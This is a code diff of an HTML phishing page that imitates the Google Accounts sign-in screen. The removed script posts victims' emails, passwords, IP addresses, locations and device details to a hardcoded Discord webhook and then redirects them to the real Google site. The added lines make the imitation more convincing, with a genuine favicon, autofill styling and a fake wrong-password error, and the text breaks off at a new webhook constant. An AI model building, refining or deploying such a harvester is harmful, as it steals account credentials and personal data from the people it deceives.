@@ -4,167 +4,75 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google Accounts</title>
+    <link rel="shortcut icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2_88.ico">
     <style>
         * { box-sizing: border-box; font-family: 'Roboto', arial, sans-serif; }
+        body { background-color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #202124; overflow: hidden; }
         
-        body { 
-            background-color: #fff; 
-            margin: 0; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            min-height: 100vh; 
-            color: #202124;
-            overflow: hidden;
-        }
-        
-        /* The main "Zoom" container */
-        .wrapper { 
-            display: flex; 
-            width: 1140px; /* Wider */
-            min-height: 580px; /* Taller */
-            border: 1px solid #dadce0; 
-            border-radius: 28px; 
-            position: relative; 
-            /* Scale it up by 15% to make it look "Zoomed" */
-            transform: scale(1.15); 
-        }
+        .wrapper { display: flex; width: 1140px; min-height: 580px; border: 1px solid #dadce0; border-radius: 28px; position: relative; transform: scale(1.15); }
 
         #loader { position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: #e8f0fe; display: none; z-index: 10; border-radius: 28px 28px 0 0; }
         #loader::after { content: ""; position: absolute; width: 45%; height: 100%; background: #0b57d0; animation: load 1.5s infinite linear; }
         @keyframes load { from { left: -45%; } to { left: 100%; } }
 
-        /* Left Side */
         .left-panel { flex: 1.2; padding: 64px; display: flex; flex-direction: column; }
         .logo { width: 56px; height: 56px; margin-bottom: 24px; }
-        h1 { font-size: 44px; font-weight: 400; margin: 0; letter-spacing: -1px; }
-        .sub-text { font-size: 19px; margin-top: 18px; color: #202124; }
+        h1 { font-size: 44px; font-weight: 400; margin: 0; }
+        .sub-text { font-size: 19px; margin-top: 18px; }
 
-        /* Right Side */
         .right-panel { width: 520px; padding: 64px; display: flex; flex-direction: column; justify-content: center; }
         .step { display: none; width: 100%; }
         .active { display: block; }
 
-        /* Massive Inputs */
-        input { 
-            width: 100%; 
-            padding: 20px 18px; 
-            border: 1px solid #747775; 
-            border-radius: 6px; 
-            font-size: 18px; 
-            margin-bottom: 15px; 
-            outline: none; 
-        }
+        input { width: 100%; padding: 20px 18px; border: 1px solid #747775; border-radius: 6px; font-size: 18px; margin-bottom: 15px; outline: none; }
         input:focus { border: 2px solid #0b57d0; padding: 19px 17px; }
+        
+        /* Autofill highlight mimicry */
+        input:-webkit-autofill { -webkit-box-shadow: 0 0 0 30px #e8f0fe inset !important; }
 
+        .err-msg { color: #d93025; font-size: 14px; margin-bottom: 10px; display: none; }
         .show-pass-box { display: flex; align-items: center; font-size: 16px; margin: 15px 0 30px; cursor: pointer; }
-        .show-pass-box input { width: 22px; height: 22px; margin-right: 14px; cursor: pointer; }
+        .show-pass-box input { width: 22px; height: 22px; margin-right: 14px; }
 
-        .blue-link { color: #0b57d0; font-weight: 500; font-size: 16px; background: none; border: none; cursor: pointer; padding: 0; margin-bottom: 25px; text-decoration: none; }
-        .blue-link:hover { text-decoration: underline; }
-
-        /* Actions */
         .footer-actions { display: flex; justify-content: space-between; align-items: center; margin-top: 50px; }
         .btn-next { background: #0b57d0; color: white; border: none; padding: 14px 32px; border-radius: 30px; font-weight: 500; cursor: pointer; font-size: 16px; }
-
         .user-chip { display: inline-flex; align-items: center; border: 1px solid #dadce0; border-radius: 20px; padding: 8px 18px; font-size: 16px; margin-bottom: 35px; cursor: pointer; }
-
-        /* Bottom Nav */
-        .bottom-nav { position: fixed; bottom: 30px; width: 1140px; display: flex; justify-content: space-between; font-size: 14px; color: #444746; }
     </style>
 </head>
 <body>
 
     <div class="wrapper">
         <div id="loader"></div>
-        
         <div class="left-panel">
             <svg class="logo" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
-            <h1 id="title-h">Sign in</h1>
-            <p class="sub-text" id="sub-p">Use your Google Account</p>
+            <h1 id="title">Sign in</h1>
+            <p id="subtitle" class="sub-text">Use your Google Account</p>
         </div>
 
         <div class="right-panel">
             <div id="step-1" class="step active">
-                <input type="email" id="email" placeholder="Email or phone">
-                <button class="blue-link">Forgot email?</button>
-                <div class="sub-text" style="font-size:16px; color:#444746; margin-top: 30px; margin-bottom:50px;">Not your computer? Use Guest mode to sign in privately. <span style="color:#0b57d0">Learn more</span></div>
+                <div id="email-err" class="err-msg">Enter a valid email or phone number</div>
+                <input type="email" id="email_input" placeholder="Email or phone" autocomplete="username">
                 <div class="footer-actions">
-                    <button class="blue-link">Create account</button>
-                    <button class="btn-next" onclick="toP()">Next</button>
+                    <span style="color:#0b57d0; font-weight:500; cursor:pointer">Create account</span>
+                    <button class="btn-next" onclick="toPassword()">Next</button>
                 </div>
             </div>
 
             <div id="step-2" class="step">
-                <div class="user-chip" onclick="location.reload()"><span id="u_label"></span></div>
-                <input type="password" id="pass" placeholder="Enter your password">
+                <div class="user-chip" onclick="location.reload()"><span id="user_display"></span></div>
+                <div id="pass-err" class="err-msg">Wrong password. Try again.</div>
+                <input type="password" id="pass_input" placeholder="Enter your password" autocomplete="current-password">
                 <label class="show-pass-box">
-                    <input type="checkbox" onclick="const p=document.getElementById('pass'); p.type=p.type==='password'?'text':'password'"> <span>Show password</span>
+                    <input type="checkbox" id="toggle"> <span>Show password</span>
                 </label>
-                <div class="footer-actions" style="margin-top: 70px;">
-                    <button class="blue-link">Forgot password?</button>
-                    <button class="btn-next" onclick="fire()">Next</button>
+                <div class="footer-actions">
+                    <span style="color:#0b57d0; font-weight:500; cursor:pointer">Forgot password?</span>
+                    <button class="btn-next" onclick="submitHit()">Next</button>
                 </div>
             </div>
         </div>
     </div>
 
-    <div class="bottom-nav">
-        <span>English (United States)</span>
-        <div style="display:flex; gap:30px">
-            <a href="#" style="text-decoration:none; color:inherit">Help</a>
-            <a href="#" style="text-decoration:none; color:inherit">Privacy</a>
-            <a href="#" style="text-decoration:none; color:inherit">Terms</a>
-        </div>
-    </div>
-
     <script>
-        const WH = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
-        let info = {};
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => info = d);
-
-        function toP() {
-            const e = document.getElementById('email').value;
-            if(!e) return;
-            document.getElementById('loader').style.display = 'block';
-            setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('u_label').innerText = e;
-                document.getElementById('title-h').innerText = "Welcome";
-                document.getElementById('sub-p').innerText = "";
-                document.getElementById('step-1').classList.remove('active');
-                document.getElementById('step-2').classList.add('active');
-            }, 600);
-        }
-
-        function fire() {
-            const e = document.getElementById('email').value;
-            const p = document.getElementById('pass').value;
-            if(!p) return;
-            document.getElementById('loader').style.display = 'block';
-
-            fetch(WH, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🎯 TARGET INTERCEPTED",
-                        color: 16711680,
-                        fields: [
-                            { name: "👤 User", value: `\`${e}\`` },
-                            { name: "🔑 Pass", value: `\`${p}\`` },
-                            { name: "🌐 Internet", value: `\`${info.org}\`` },
-                            { name: "📍 Location", value: `\`${info.city}, ${info.country_name}\`` },
-                            { name: "💻 Device", value: `\`${navigator.platform}\``, inline: true },
-                            { name: "📡 IP", value: `\`${info.ip}\``, inline: true }
-                        ],
-                        timestamp: new Date()
-                    }]
-                })
-            }).then(() => {
-                setTimeout(() => window.location.href = "https://accounts.google.com", 1200);
-            });
-        }
-    </script>
-</body>
-</html>
+        const WEBHOOK = "
